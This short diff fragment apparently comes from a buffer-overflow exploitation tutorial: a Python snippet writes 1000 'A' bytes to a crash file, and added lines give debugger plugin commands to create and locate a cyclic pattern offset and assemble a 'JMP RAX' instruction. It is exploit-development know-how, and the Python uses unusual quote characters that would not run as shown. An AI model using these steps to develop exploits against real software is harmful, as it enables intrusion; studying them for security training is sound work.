@@ -23,3 +23,9 @@ f = open(«crash-1.txt», «wb»)
    buf = b «A» * 1000 
    f.write(buf) 
 f.close()
+ERC ‑config SetWorkingDirectory C:\Users\YourUserName\DirectoryYouWillBeWorkingFrom
+
+ERC ‑config SetAuthor AuthorsName
+ERC ‑pattern c 1000
+ERC ‑pattern o 9xA8xA7x
+ERC ‑assemble JMP RAX.
